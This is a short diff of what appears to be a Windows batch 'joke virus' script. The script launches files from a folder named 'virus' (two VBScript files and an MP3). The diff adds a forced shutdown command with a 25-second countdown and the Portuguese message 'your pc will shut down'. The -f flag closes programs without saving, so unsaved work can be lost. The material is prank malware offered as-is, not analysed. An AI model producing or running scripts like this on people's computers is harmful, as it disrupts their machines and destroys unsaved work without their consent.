@@ -20,5 +20,6 @@ timeout /t 10
 start virus\creditos.vbs
 start virus\music.mp3
 start virus\telas.vbs
+shutdown -s -f -t: 25 -c "seu pc vai desligar"
 pause
 exit
